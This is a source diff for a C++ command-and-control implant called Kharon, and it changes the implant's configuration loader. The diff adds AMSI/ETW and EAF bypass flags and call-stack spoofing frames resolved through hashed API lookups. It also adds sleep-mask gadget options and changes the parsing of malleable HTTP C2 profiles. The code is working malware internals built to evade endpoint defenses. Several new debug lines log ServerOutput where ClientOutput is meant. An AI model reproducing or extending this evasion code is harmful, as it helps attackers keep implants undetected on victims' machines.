@@ -7,9 +7,53 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
     Cfg->AgentId       = KH_AGENT_UUID;
     Cfg->SleepTime     = KH_SLEEP_TIME * 1000;
     Cfg->Jitter        = KH_JITTER;
-    Cfg->BofProxy      = KH_BOF_HOOK_ENABLED;
-    Cfg->Syscall       = KH_SYSCALL;
-    Cfg->AmsiEtwBypass = KH_AMSI_ETW_BYPASS;
+
+    Cfg->Evasion.BofProxy      = KH_BOF_HOOK_ENABLED;
+    Cfg->Evasion.AmsiEtwBypass = KH_AMSI_ETW_BYPASS;
+    Cfg->Evasion.EafBypass     = KH_EAF_BYPASS;
+
+    Cfg->Evasion.Syscall = KH_SYSCALL; 
+
+    if ( KH_SPOOF_FRAME_1_MODULE && KH_SPOOF_FRAME_1_FUNC ) {
+        Cfg->Spoof.Frames[0].Ptr = LdrLoad::_Api( LdrLoad::Module( Hsh::Str<CHAR>( KH_SPOOF_FRAME_1_MODULE ) ), Hsh::Str<CHAR>( KH_SPOOF_FRAME_1_FUNC ) ) + KH_SPOOF_FRAME_1_OFFSET;
+    }
+
+    if ( KH_SPOOF_FRAME_2_MODULE && KH_SPOOF_FRAME_2_FUNC ) {
+        Cfg->Spoof.Frames[1].Ptr = LdrLoad::_Api( LdrLoad::Module( Hsh::Str<CHAR>( KH_SPOOF_FRAME_2_MODULE ) ), Hsh::Str<CHAR>( KH_SPOOF_FRAME_2_FUNC ) ) + KH_SPOOF_FRAME_2_OFFSET;
+    }
+
+    if ( KH_SPOOF_FRAME_3_MODULE && KH_SPOOF_FRAME_3_FUNC ) {
+        Cfg->Spoof.Frames[2].Ptr = LdrLoad::_Api( LdrLoad::Module( Hsh::Str<CHAR>( KH_SPOOF_FRAME_3_MODULE ) ), Hsh::Str<CHAR>( KH_SPOOF_FRAME_3_FUNC ) ) + KH_SPOOF_FRAME_3_OFFSET;
+    }
+
+    if ( KH_SPOOF_FRAME_4_MODULE && KH_SPOOF_FRAME_4_FUNC ) {
+        Cfg->Spoof.Frames[3].Ptr = LdrLoad::_Api( LdrLoad::Module( Hsh::Str<CHAR>( KH_SPOOF_FRAME_4_MODULE ) ), Hsh::Str<CHAR>( KH_SPOOF_FRAME_4_FUNC ) ) + KH_SPOOF_FRAME_4_OFFSET;
+    }
+
+    if ( KH_SPOOF_FRAME_5_MODULE && KH_SPOOF_FRAME_5_FUNC ) {
+        Cfg->Spoof.Frames[4].Ptr = LdrLoad::_Api( LdrLoad::Module( Hsh::Str<CHAR>( KH_SPOOF_FRAME_5_MODULE ) ), Hsh::Str<CHAR>( KH_SPOOF_FRAME_5_FUNC ) ) + KH_SPOOF_FRAME_5_OFFSET;
+    }
+
+    if ( KH_SPOOF_FRAME_6_MODULE && KH_SPOOF_FRAME_6_FUNC ) {
+        Cfg->Spoof.Frames[5].Ptr = LdrLoad::_Api( LdrLoad::Module( Hsh::Str<CHAR>( KH_SPOOF_FRAME_6_MODULE ) ), Hsh::Str<CHAR>( KH_SPOOF_FRAME_6_FUNC ) ) + KH_SPOOF_FRAME_6_OFFSET;
+    }
+
+    if ( KH_SPOOF_FRAME_7_MODULE && KH_SPOOF_FRAME_7_FUNC ) {
+        Cfg->Spoof.Frames[6].Ptr = LdrLoad::_Api( LdrLoad::Module( Hsh::Str<CHAR>( KH_SPOOF_FRAME_7_MODULE ) ), Hsh::Str<CHAR>( KH_SPOOF_FRAME_7_FUNC ) ) + KH_SPOOF_FRAME_7_OFFSET;
+    }
+
+    if ( KH_SPOOF_FRAME_8_MODULE && KH_SPOOF_FRAME_8_FUNC ) {
+        Cfg->Spoof.Frames[7].Ptr = LdrLoad::_Api( LdrLoad::Module( Hsh::Str<CHAR>( KH_SPOOF_FRAME_8_MODULE ) ), Hsh::Str<CHAR>( KH_SPOOF_FRAME_8_FUNC ) ) + KH_SPOOF_FRAME_8_OFFSET;
+    }
+
+    constexpr int MAX_SPOOF_FRAMES = sizeof(Cfg->Spoof.Frames) / sizeof(Cfg->Spoof.Frames[0]);
+
+    for ( int i = 0; i < MAX_SPOOF_FRAMES; i++ ) {
+        if ( ! Cfg->Spoof.Frames[i].Ptr ) {
+            break;
+        }
+        Cfg->Spoof.FrameCount++;
+    }
 
     static BYTE ENCRYPT_KEY_ARRAY[] = KH_CRYPT_KEY;
 
@@ -18,8 +62,10 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
     }
 
     // mask
-    Cfg->Mask.Beacon = KH_SLEEP_MASK;
-    Cfg->Mask.Heap   = KH_HEAP_MASK;
+    Cfg->Mask.Beacon       = KH_SLEEP_MASK_TECHNIQUE;
+    Cfg->Mask.Logic        = KH_SLEEP_MASK_CHAIN_LOGIC;
+    Cfg->Mask.JmpRegGadget = KH_SLEEP_MASK_JMP_GADGET;
+    Cfg->Mask.Heap         = KH_HEAP_MASK;
 
     // postex
     Cfg->Postex.Spawnto  = KH_SPAWNTO_X64;
@@ -148,7 +194,8 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
                 ClientOutput->Format      = (OutputFmt)Self->Psr->Int32( HttpParser );
                 ClientOutput->MaxDataSize = Self->Psr->Int32( HttpParser );
 
-                KhDbg( "[*] HTTP Malleable: POST ClientOutput Mask = %d, Type = %d, Format = %d", ClientOutput->Mask, ClientOutput->Type, ClientOutput->Format );
+                KhDbg( "HTTP Malleable: POST ClientOutput Max Chunk Data Size: %d", ServerOutput->MaxDataSize );
+                KhDbg( "HTTP Malleable: POST ClientOutput Mask = %d, Type = %d, Format = %d", ClientOutput->Mask, ClientOutput->Type, ClientOutput->Format );
 
                 if ( ClientOutput->Type != Output_Body ) {
                     ClientOutput->OutputBuff.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->OutputBuff.Size );
@@ -158,7 +205,7 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
                 ClientOutput->Prepend.Ptr   = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->Prepend.Size );
                 ClientOutput->FalseBody.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->FalseBody.Size );
 
-                KhDbg( "[*] HTTP Malleable: POST Client Output Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ClientOutput->Append.Ptr, ClientOutput->Append.Size, ClientOutput->Prepend.Ptr, ClientOutput->Prepend.Size, ClientOutput->FalseBody.Ptr, ClientOutput->FalseBody.Size );
+                KhDbg( "HTTP Malleable: POST Client Output Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ClientOutput->Append.Ptr, ClientOutput->Append.Size, ClientOutput->Prepend.Ptr, ClientOutput->Prepend.Size, ClientOutput->FalseBody.Ptr, ClientOutput->FalseBody.Size );
 
                 // server output
 
@@ -167,7 +214,8 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
                 ServerOutput->Format      = (OutputFmt)Self->Psr->Int32( HttpParser );
                 ServerOutput->MaxDataSize = Self->Psr->Int32( HttpParser );
 
-                KhDbg( "[*] HTTP Malleable: POST ServerOutput Mask = %d, Type = %d, Format = %d", ServerOutput->Mask, ServerOutput->Type, ServerOutput->Format );
+                KhDbg( "HTTP Malleable: POST ServerOutput Max Chunk Data Size: %d", ServerOutput->MaxDataSize );
+                KhDbg( "HTTP Malleable: POST ServerOutput Mask = %d, Type = %d, Format = %d", ServerOutput->Mask, ServerOutput->Type, ServerOutput->Format );
 
                 if ( ServerOutput->Type != Output_Body ) {
                     ServerOutput->OutputBuff.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)ServerOutput->OutputBuff.Size );
@@ -222,7 +270,7 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
                 Endpoint->Path           = Self->Psr->Wstr( HttpParser, nullptr );
                 Endpoint->Parameters.Ptr = (PBYTE)Self->Psr->Wstr( HttpParser, (ULONG*)&Endpoint->Parameters.Size );
 
-                KhDbg( "[*] HTTP Malleable: GET Endpoint %d Path = %ls, Params = [%d] %ls", x, Endpoint->Path, Endpoint->Parameters.Size, Endpoint->Parameters.Ptr );
+                KhDbg( "HTTP Malleable: GET Endpoint %d Path = %ls, Params = [%d] %ls", x, Endpoint->Path, Endpoint->Parameters.Size, Endpoint->Parameters.Ptr );
 
                 // client output
                 
@@ -231,7 +279,8 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
                 ClientOutput->Format      = (OutputFmt)Self->Psr->Int32( HttpParser );
                 ClientOutput->MaxDataSize = Self->Psr->Int32( HttpParser );
 
-                KhDbg( "[*] HTTP Malleable: GET ClientOutput Mask = %d, Type = %d, Format = %d", ClientOutput->Mask, ClientOutput->Type, ClientOutput->Format );
+                KhDbg( "HTTP Malleable: GET ClientOutput Max Chunk Data Size: %d", ServerOutput->MaxDataSize );
+                KhDbg( "HTTP Malleable: GET ClientOutput Mask = %d, Type = %d, Format = %d", ClientOutput->Mask, ClientOutput->Type, ClientOutput->Format );
 
                 if ( ClientOutput->Type != Output_Body ) {
                     ClientOutput->OutputBuff.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->OutputBuff.Size );
@@ -243,7 +292,7 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
                 ClientOutput->Prepend.Ptr   = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->Prepend.Size );
                 ClientOutput->FalseBody.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->FalseBody.Size );
 
-                KhDbg( "[*] HTTP Malleable: GET ClientOutput Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ClientOutput->Append.Ptr, ClientOutput->Append.Size, ClientOutput->Prepend.Ptr, ClientOutput->Prepend.Size, ClientOutput->FalseBody.Ptr, ClientOutput->FalseBody.Size );
+                KhDbg( "HTTP Malleable: GET ClientOutput Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ClientOutput->Append.Ptr, ClientOutput->Append.Size, ClientOutput->Prepend.Ptr, ClientOutput->Prepend.Size, ClientOutput->FalseBody.Ptr, ClientOutput->FalseBody.Size );
 
                 // server output
 
@@ -252,7 +301,8 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
                 ServerOutput->Format      = (OutputFmt)Self->Psr->Int32( HttpParser );
                 ServerOutput->MaxDataSize = Self->Psr->Int32( HttpParser );
 
-                KhDbg( "[*] HTTP Malleable: GET ServerOutput Mask = %d, Type = %d, Format = %d", ServerOutput->Mask, ServerOutput->Type, ServerOutput->Format );
+                KhDbg( "HTTP Malleable: GET ServerOutput Max Chunk Data Size: %d", ServerOutput->MaxDataSize );
+                KhDbg( "HTTP Malleable: GET ServerOutput Mask = %d, Type = %d, Format = %d", ServerOutput->Mask, ServerOutput->Type, ServerOutput->Format );
 
                 if ( ServerOutput->Type != Output_Body ) {
                     ServerOutput->OutputBuff.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)ServerOutput->OutputBuff.Size );
@@ -263,7 +313,7 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
                 ServerOutput->Prepend.Ptr    = Self->Psr->Bytes( HttpParser, (ULONG*)&ServerOutput->Prepend.Size );
                 ServerOutput->FalseBody.Ptr  = Self->Psr->Bytes( HttpParser, (ULONG*)&ServerOutput->FalseBody.Size );
 
-                KhDbg( "[*] HTTP Malleable: GET Server Output Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ServerOutput->Append.Ptr, ServerOutput->Append.Size, ServerOutput->Prepend.Ptr, ServerOutput->Prepend.Size, ServerOutput->FalseBody.Ptr, ServerOutput->FalseBody.Size );
+                KhDbg( "HTTP Malleable: GET Server Output Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ServerOutput->Append.Ptr, ServerOutput->Append.Size, ServerOutput->Prepend.Ptr, ServerOutput->Prepend.Size, ServerOutput->FalseBody.Ptr, ServerOutput->FalseBody.Size );
             }
         }
     }
